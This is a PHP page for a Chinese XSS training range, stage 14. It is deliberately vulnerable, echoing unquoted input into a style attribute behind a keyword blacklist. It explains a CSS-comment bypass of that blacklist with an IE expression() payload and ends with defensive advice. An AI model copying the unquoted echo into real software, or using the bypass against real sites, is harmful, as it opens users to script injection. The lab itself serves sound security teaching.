<?php
/**
 * XSS Challenges - Stage #14
 * CSS expression 绕过正则过滤
 *
 * 漏洞成因：
 *   基于 Stage 13，p1 输出到 input 标签的 style 和 value 属性中（无引号）
 *   额外增加过滤：s/(url|script|eval|expression)/xxx/ig
 *   style 和 value 统一过滤 " 和 >，通过 style 位置执行 JS 代码
 *   绕过方式：用 CSS 注释分割关键字 expression → expr/&#42;&#42;/ession
 *
 * 通关 Payload（仅 IE 可解）：
 *   xuegod:expr/&#42;&#42;/ession(alert(document.domain));
 */

// 获取参数
$p1_raw = isset($_GET['p1']) && $_GET['p1'] !== '' ? $_GET['p1'] : '';
$searched = isset($_GET['p1']);

// 过滤规则：正则匹配 url|script|eval|expression → xxx
$p1 = preg_replace('/(url|script|eval|expression)/i', 'xxx', $p1_raw);

// 过滤 ">
$p1 = str_replace('"', '&quot;', $p1);
$p1 = str_replace('>', '&gt;', $p1);

// 默认值
$default = 'background:salmon';
$style_val = $searched ? $p1 : $default;
$value_val = $searched ? $p1 : $default;
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=7">
  <title>XSS Challenges - Stage #14</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="site-header clearfix">
  <a class="logo" href="../../index.php">极客事纪 XSS<span>·</span>Challenges靶场</a>
  <div class="site-nav"><a href="../../index.php">首页</a></div>
  <!--[if IE]><div style="clear:both;height:0;overflow:hidden"></div><![endif]-->
</div>

<div class="stage-banner">
  <span class="stage-badge">STAGE #14</span>
  <h1>CSS expression 绕过正则过滤</h1>
  <span class="difficulty">难度：★★★★★ 专家</span>
</div>

<div class="site-main">
  <div class="task-card">
    <h2>任务目标</h2>
    <p>在搜索框中注入 XSS 代码，使页面弹出 <code>alert</code> 对话框，内容显示当前页面的 <strong>document.domain</strong>。<br>表单参数名为 <code style="color:#e94560;">p1</code>，通过 GET 方式提交。</p>
    <div class="hint">💡 提示（选中以下文字查看）：<span class="hint-content">过滤规则：s/(url|script|eval|expression)/xxx/ig</span></div>
  </div>

  <div class="lab-area">
    <h2>🔍 靶场第十四关</h2>
    <?php if ($searched): ?>
    <div class="url-bar">GET <?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>?<span class="url-key">p1</span>=<span class="url-val"><?php echo htmlspecialchars($p1_raw, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <?php endif; ?>
    <form class="search-form" method="GET" action="">
      <input type="text" name="p1" style=<?php echo $style_val; ?> value=<?php echo $value_val; ?>>
      <button type="submit">搜索</button>
    </form>
  </div>

  <div class="knowledge-section">
    <button class="knowledge-toggle" onclick="this.parentElement.classList.toggle('expanded')">
      <span class="toggle-icon">▶</span> 知识点解析
    </button>
    <div class="knowledge-content">

    <div class="knowledge-item">
      <h3>1. 后端 PHP 漏洞代码</h3>
      <p>本关基于 Stage 13（无过滤的 CSS 注入），额外增加了正则过滤，阻止 <code>url</code>、<code>script</code>、<code>eval</code>、<code>expression</code> 四个关键字：</p>
      <div class="code-block"><span class="hl-php">&lt;?php</span>
<span class="hl-comment">// 获取参数</span>
<span class="hl-var">$p1</span> = <span class="hl-var">$_GET</span>[<span class="hl-str">'p1'</span>];

<span class="hl-comment">// 过滤规则：s/(url|script|eval|expression)/xxx/ig</span>
<span class="hl-var">$p1</span> = <span class="hl-fn">preg_replace</span>(<span class="hl-str">'/(url|script|eval|expression)/i'</span>, <span class="hl-str">'xxx'</span>, <span class="hl-var">$p1</span>);

<span class="hl-comment">// style 和 value 统一输出 $p1（str_replace 过滤 " 和 >）</span>
<span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">style</span>=<span class="hl-val">&lt;?php echo $p1; ?&gt;</span> <span class="hl-attr">value</span>=<span class="hl-val">&lt;?php echo $p1; ?&gt;</span><span class="hl-tag">&gt;</span></div>
      <p>过滤分析：</p>
      <ul>
        <li><code>url</code> → <code>xxx</code>：Stage 13 的 <code>background:url("javascript:...")</code> 被封堵</li>
        <li><code>expression</code> → <code>xxx</code>：CSS expression() 直接使用被封堵</li>
        <li><code>script</code> → <code>xxx</code>：&lt;script&gt; 标签注入被封堵</li>
        <li><code>eval</code> → <code>xxx</code>：JavaScript eval() 函数被封堵</li>
      </ul>
    </div>

    <div class="knowledge-item">
      <h3>2. 绕过思路：CSS 注释分割关键字</h3>
      <p>CSS 支持使用 <code>/* */</code> 作为注释，注释会被 CSS 解析器忽略。可以利用注释将被过滤的关键字"拆开"，使其不被正则匹配，但在 CSS 渲染时仍然被正确识别：</p>
      <div class="code-block"><span class="hl-comment">// 正则匹配的是字符串 "expression"</span>
<span class="hl-comment">// 如果在中间插入注释：expr&lt;空注释&gt;ession</span>
<span class="hl-comment">// 正则 /expression/i 无法匹配 "expr...ession"</span>
<span class="hl-comment">// 但 CSS 解析器会忽略注释，识别为 expression</span></div>
    </div>

    <div class="knowledge-item">
      <h3>3. Payload 构造</h3>
      <p>通关 Payload：</p>
      <div class="code-block">stage14.php?p1=<span class="hl-inject">xuegod:expr/**/ession(alert(document.domain));</span></div>
      <p>服务端处理过程：</p>
      <div class="code-block"><span class="hl-comment">// 原始输入</span>
<span class="hl-var">$p1</span> = <span class="hl-str">'xuegod:expr/**/ession(alert(document.domain));'</span>;

<span class="hl-comment">// preg_replace /(url|script|eval|expression)/i 匹配检查：</span>
<span class="hl-comment">//   "url"       → 不存在 ✗</span>
<span class="hl-comment">//   "script"    → 不存在 ✗</span>
<span class="hl-comment">//   "eval"      → 不存在 ✗（"expr" 不是 "eval"）</span>
<span class="hl-comment">//   "expression"→ 不存在 ✗（被 CSS 注释分割为 "expr" 和 "ession"）</span>
<span class="hl-comment">// 所有过滤均未命中，$p1 原样保留！</span>

<span class="hl-comment">// 最终输出</span>
<span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">style</span>=<span class="hl-val"><span class="hl-inject">xuegod:expr/**/ession(alert(document.domain));</span></span> <span class="hl-attr">value</span>=<span class="hl-val">xuegod:expr/**/ession(alert(document.domain));</span><span class="hl-tag">&gt;</span></div>
    </div>

    <div class="knowledge-item">
      <h3>4. CSS expression() 执行原理</h3>
      <p><code>expression()</code> 是 IE 特有的 CSS 函数，允许在 CSS 属性值中嵌入 JavaScript 表达式。当浏览器对元素进行布局计算（Layout）时会执行该表达式：</p>
      <div class="code-block"><span class="hl-comment">/* 标准 CSS */</span>
<span class="hl-tag">width:</span> <span class="hl-val">200px</span>;

<span class="hl-comment">/* IE 特有 — expression 中执行 JS */</span>
<span class="hl-tag">width:</span> <span class="hl-fn">expression</span>(<span class="hl-js">alert(document.domain)</span>);</div>
      <p>关键点：</p>
      <ul>
        <li><code>expression()</code> 必须用在<strong>影响布局</strong>的 CSS 属性上（如 <code>width</code>、<code>height</code>、<code>padding</code> 等），否则不会触发执行</li>
        <li>本关 Payload 中的 <code>xuegod:expr/**/ession(...)</code>，CSS 解析器忽略 <code>/**/</code> 注释后，<code>xuegod</code> 被视为未知属性忽略，<code>expr/**/ession</code> 被识别为 <code>expression</code></li>
        <li>在 IE6/IE7 中直接执行；在 IE8+ 标准模式下 expression 已被废弃；本关通过 <code>&lt;meta http-equiv="X-UA-Compatible" content="IE=7"&gt;</code> 强制 IE7 兼容模式，使 IE8/IE9/IE10 也能触发执行</li>
        <li>IE 的 CSS 表达式解析器对 JS 语法较宽松，有时会在控制台输出"脚本发生错误"或"语法错误"警告，但 <code>alert</code> 仍能正常执行，无需在意</li>
      </ul>
    </div>

    <div class="knowledge-item">
      <h3>5. 安全防御建议</h3>
      <p>本关展示了<strong>黑名单过滤</strong>的局限性——攻击者总有办法绕过。正确的防御方式：</p>
      <div class="code-block"><span class="hl-php">&lt;?php</span>
<span class="hl-comment">// ❌ 黑名单：攻击者可以用 CSS 注释、大小写混合等方式绕过</span>
<span class="hl-var">$p1</span> = <span class="hl-fn">preg_replace</span>(<span class="hl-str">'/(url|script|eval|expression)/i'</span>, <span class="hl-str">'xxx'</span>, <span class="hl-var">$p1</span>);

<span class="hl-comment">// ✅ 正确做法：不要将用户输入放入 style 属性</span>
<span class="hl-comment">// ✅ 如果必须动态样式，通过 class 或白名单控制</span>
<span class="hl-comment">// ✅ 使用 Content-Security-Policy 头禁止内联样式</span>
<span class="hl-comment">//    Content-Security-Policy: style-src 'self'; default-src 'self'</span>
<span class="hl-php">?&gt;</span></div>
    </div>

    <div class="knowledge-item">
      <h3>互动思考 💬</h3>
      <p><strong>问：</strong>如果过滤规则改为 <code>s/(url|script|eval|expression)\b/i</code>（要求关键字后面是单词边界），<code>expr/**/ession</code> 还能绕过吗？</p>
      <p><strong>答：</strong>可以。因为 <code>expr/**/ession</code> 本身就不包含完整的 <code>expression</code>，所以无论是否加 <code>\b</code>，正则都无法匹配。CSS 注释绕过的核心在于<strong>在原始字符串层面破坏关键字的完整性</strong>，而不是依赖关键字边界的处理。</p>
    </div>
  </div>
</div>

<div class="site-footer"> 极客事纪 XSS Challenges靶场 &nbsp;·&nbsp; 仅供 <span>安全学习</span> 使用 </div>
</body>
</html>
